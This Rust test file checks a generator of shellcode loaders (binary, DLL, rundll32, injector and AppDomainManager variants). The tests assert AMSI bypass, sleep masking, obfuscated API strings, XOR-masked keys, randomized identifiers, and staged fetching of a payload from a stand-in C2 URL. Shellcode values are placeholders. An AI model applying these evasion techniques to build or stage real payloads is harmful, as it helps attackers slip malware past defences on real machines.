use template_engine::*;

#[test]
fn test_appdomain_csharp_renders() {
    let config = LoaderConfig {
        loader_type: LoaderType::AppDomain,
        features:    vec![],
        encryption:  Encryption::Aes256,
        shellcode_hex: "9090909090".into(),
        key_hex:      "aa".repeat(32),
        iv_hex:       "bb".repeat(16),
        pe_config:    None,
        appdomain_config: Some(AppDomainConfig {
            clr_version:   "v4.0.30319".into(),
            net_version:   "4.0".into(),
            assembly_name: "xTestLoader".into(),
            type_name:     "yTestClass".into(),
            namespace:     "zTestNs".into(),
        }),
        wsf_stub_config: None,
        dotnet_stub_hex: None,
        staged: None,
    };
    let src = generate_csharp_source(&config).unwrap();
    assert!(src.contains("AppDomainManager"), "missing AppDomainManager base class");
    assert!(src.contains("InitializeNewDomain"), "missing InitializeNewDomain override");
    assert!(src.contains("zTestNs"), "missing namespace");
    assert!(src.contains("yTestClass"), "missing class name");
    assert!(!src.contains("ntdll.dll"), "plaintext ntdll.dll string in output");
    assert!(!src.contains("NtAllocateVirtualMemory"), "plaintext NtAllocateVirtualMemory string in output");
    assert!(!src.contains("NtCreateThreadEx"), "plaintext NtCreateThreadEx string in output");
}

#[test]
fn test_appdomain_two_builds_produce_different_identifiers() {
    let config = LoaderConfig {
        loader_type: LoaderType::AppDomain,
        features:    vec![],
        encryption:  Encryption::Aes256,
        shellcode_hex: "9090".into(),
        key_hex:      "aa".repeat(32),
        iv_hex:       "bb".repeat(16),
        pe_config:    None,
        appdomain_config: Some(AppDomainConfig {
            clr_version:   "v4.0.30319".into(),
            net_version:   "4.0".into(),
            assembly_name: "Loader1".into(),
            type_name:     "Class1".into(),
            namespace:     "Ns1".into(),
        }),
        wsf_stub_config: None,
        dotnet_stub_hex: None,
        staged: None,
    };
    let src1 = generate_csharp_source(&config).unwrap();
    let src2 = generate_csharp_source(&config).unwrap();
    assert_ne!(src1, src2, "Two AppDomain builds produced identical source (no randomization)");
}

#[test]
fn test_binary_template_generates_valid_rust() {
    // Only check that template generates valid-looking Rust source.
    // Full compilation test requires libscaffold.rlib which takes ~90s to build.
    let config = LoaderConfig {
        loader_type: LoaderType::Binary,
        features: vec![Feature::AmsiHwbp, Feature::SleepEncrypt],
        encryption: Encryption::Aes256,
        shellcode_hex: "909090909090".into(),
        key_hex: format!("{:0>64}", "deadbeef"),
        iv_hex:  format!("{:0>32}", "cafebabe"),
        pe_config: None,
        appdomain_config: None,
        wsf_stub_config: None,
        dotnet_stub_hex: None,
        staged: None,
    };
    let source = generate_loader_source(&config).unwrap();

    // Basic structural checks
    assert!(source.contains("extern crate scaffold;"), "missing scaffold extern crate");
    assert!(source.contains("fn main()"), "missing main function");
    assert!(source.contains("run_no_rwx"), "missing run_no_rwx call");
    assert!(source.contains("install_amsi_bypass"), "AMSI bypass not included");
    assert!(source.contains("masked_sleep"), "sleep masking not included");

    // Verify randomized identifiers: no plain 'shellcode' or 'key' identifiers
    assert!(!source.contains("let shellcode "), "found unrandomized 'shellcode' identifier");
    assert!(!source.contains("let key "), "found unrandomized 'key' identifier");
}

#[test]
fn test_binary_key_is_masked() {
    // key = all 0xAA bytes; plain decimal value is 170
    let config = LoaderConfig {
        loader_type: LoaderType::Binary,
        features: vec![],
        encryption: Encryption::Aes256,
        shellcode_hex: "9090".into(),
        key_hex: "aa".repeat(32),
        iv_hex:  "bb".repeat(16),
        pe_config: None,
        appdomain_config: None,
        wsf_stub_config: None,
        dotnet_stub_hex: None,
        staged: None,
    };
    let source = generate_loader_source(&config).unwrap();
    // XOR unmask loop must appear
    assert!(source.contains("^="), "key must be XOR-unmasked at runtime");
    // Five consecutive plain key bytes (170,170,170,170,170) must NOT appear
    assert!(!source.contains("170,170,170,170,170,"),
        "plain key bytes must not appear consecutively in source");
}

fn rust_pe_staged_config(t: LoaderType) -> LoaderConfig {
    LoaderConfig {
        loader_type: t,
        features: vec![Feature::AmsiHwbp],
        encryption: Encryption::Aes256,
        shellcode_hex: "00".into(),
        key_hex: "00".repeat(32),
        iv_hex:  "00".repeat(16),
        pe_config: None,
        appdomain_config: None,
        wsf_stub_config: None,
        dotnet_stub_hex: None,
        staged: Some(StagedConfig {
            url:        "https://c2.example.com/api/v1/stage/aabbccddeeff0011".into(),
            jwt:        "AAA.BBB.CCC".into(),
            user_agent: "Mozilla/5.0".into(),
        }),
    }
}

fn assert_pe_staged_source(label: &str, src: &str) {
    assert!(src.contains("scaffold::stager::fetch"),
        "{} staged must call scaffold::stager::fetch", label);
    assert!(!src.contains("https://c2.example.com"),
        "{} staged URL must be XOR-encoded, not plaintext", label);
    assert!(!src.contains("AAA.BBB.CCC"),
        "{} staged JWT must be XOR-encoded, not plaintext", label);
    assert!(!src.contains("decrypt_aes256") && !src.contains("decrypt_chacha20"),
        "{} staged mode must skip embedded shellcode decryption path", label);
}

#[test]
fn test_binary_staged_mode_uses_fetch() {
    let src = generate_loader_source(&rust_pe_staged_config(LoaderType::Binary)).unwrap();
    assert_pe_staged_source("Binary", &src);
}

#[test]
fn test_dll_staged_mode_uses_fetch() {
    let src = generate_loader_source(&rust_pe_staged_config(LoaderType::Dll)).unwrap();
    assert_pe_staged_source("Dll", &src);
}

#[test]
fn test_rundll32_staged_mode_uses_fetch() {
    let src = generate_loader_source(&rust_pe_staged_config(LoaderType::Rundll32)).unwrap();
    assert_pe_staged_source("Rundll32", &src);
}

#[test]
fn test_injector_staged_mode_uses_fetch() {
    let src = generate_loader_source(&rust_pe_staged_config(LoaderType::Injector)).unwrap();
    assert_pe_staged_source("Injector", &src);
}

#[test]
fn test_stageless_still_embeds_shellcode() {
    // Regression: a Binary build without `staged` must still embed shellcode + key.
    let config = LoaderConfig {
        loader_type: LoaderType::Binary,
        features: vec![],
        encryption: Encryption::Aes256,
        shellcode_hex: "fc4883e4f0".into(),
        key_hex: "deadbeef".repeat(8),
        iv_hex:  "11223344".repeat(4),
        pe_config: None,
        appdomain_config: None,
        wsf_stub_config: None,
        dotnet_stub_hex: None,
        staged: None,
    };
    let src = generate_loader_source(&config).unwrap();
    assert!(src.contains("decrypt_aes256"),
        "stageless mode must use embedded decrypt path");
    assert!(!src.contains("scaffold::stager::fetch"),
        "stageless mode must not call the stager");
}

#[test]
fn test_two_builds_produce_different_identifiers() {
    let config = LoaderConfig {
        loader_type: LoaderType::Binary,
        features: vec![],
        encryption: Encryption::Aes256,
        shellcode_hex: "9090".into(),
        key_hex: "aa".repeat(32),
        iv_hex: "bb".repeat(16),
        pe_config: None,
        appdomain_config: None,
        wsf_stub_config: None,
        dotnet_stub_hex: None,
        staged: None,
    };
    let source1 = generate_loader_source(&config).unwrap();
    let source2 = generate_loader_source(&config).unwrap();
    // Different randomized identifiers each build
    assert_ne!(source1, source2, "Two builds produced identical source (no randomization)");
}

#[test]
fn test_appdomain_config_structure() {
    let config = AppDomainTemplateConfig {
        clr_version:   "v4.0.30319".into(),
        net_version:   "4.0".into(),
        appdomain_name: "EvilDomain.Manager".into(),
        assembly_name: "EvilLoader".into(),
    };
    let xml = generate_appdomain_config(&config).unwrap();
    assert!(xml.contains("v4.0.30319"));
    assert!(xml.contains("EvilDomain.Manager"));
    assert!(xml.contains("<configuration>"));
    assert!(xml.contains("</configuration>"));
}

#[test]
fn test_appdomain_category_is_dotnet_compiled() {
    assert_eq!(
        LoaderType::AppDomain.category(),
        OutputCategory::DotNetCompiled,
    );
}

#[test]
fn test_appdomain_config_xml_has_assembly_element() {
    let cfg = AppDomainTemplateConfig {
        clr_version:   "v4.0.30319".into(),
        net_version:   "4.0".into(),
        appdomain_name: "xKqPm.nBvWs".into(),
        assembly_name: "dKqRmFpX".into(),
    };
    let xml = generate_appdomain_config(&cfg).unwrap();
    assert!(xml.contains("AppDomainManagerType"),     "missing AppDomainManagerType");
    assert!(xml.contains("AppDomainManagerAssembly"), "missing AppDomainManagerAssembly");
    assert!(xml.contains("xKqPm.nBvWs"),              "missing fqn type name");
    assert!(xml.contains("dKqRmFpX"),                 "missing assembly name");
}
